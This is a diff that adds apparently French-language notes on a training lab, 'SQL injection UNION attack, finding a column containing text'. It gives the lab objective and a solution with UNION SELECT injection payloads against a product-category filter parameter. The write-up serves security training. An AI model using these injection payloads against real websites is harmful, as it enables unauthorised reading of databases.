@@ -1,0 +1,35 @@
+#SQL injection UNION attack, finding a column containing text
+
+#Objectif :
+
+Ce laboratoire contient une vulnérabilité d'injection SQL dans le filtre de la catégorie de produit. Les résultats de la requête sont renvoyés dans la réponse de l'application, vous pouvez donc utiliser une attaque UNION pour récupérer des données à partir d'autres tables. Pour construire une telle attaque, il faut d'abord déterminer le nombre de colonnes renvoyées par la requête. Vous pouvez le faire en utilisant une technique que vous avez apprise dans un laboratoire précédent. L'étape suivante consiste à identifier une colonne compatible avec les données de chaîne.
+
+Le laboratoire fournira une valeur aléatoire que vous devrez faire apparaître dans les résultats de la requête. Pour résoudre le laboratoire, effectuez une attaque UNION à injection SQL qui retourne une ligne supplémentaire contenant la valeur fournie. Cette technique vous aide à déterminer quelles colonnes sont compatibles avec les données de chaîne.
+
+Correction:
+
+Step1
+
+Oder by 1-- | UNION SELECT NULL,NULL,NULL--
+
+
+filter?category=Gifts' UNION SELECT NULL--
+
+filter?category=Gifts' UNION SELECT NULL,NULL--
+
+filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
+
+
+Step2
+
+filter?category=Gifts' UNION SELECT 'GFvusL',NULL,NULL--
+
+filter?category=Gifts' UNION SELECT 'GFvusL','GFvusL',NULL--
+
+filter?category=Gifts' UNION SELECT NULL,'GFvusL',NULL--
+
+filter?category=Gifts' UNION SELECT NULL,NULL,'GFvusL'--
+
+filter?category=Pets' UNION SELECT NULL,'GFvusL',NULL--
+
+
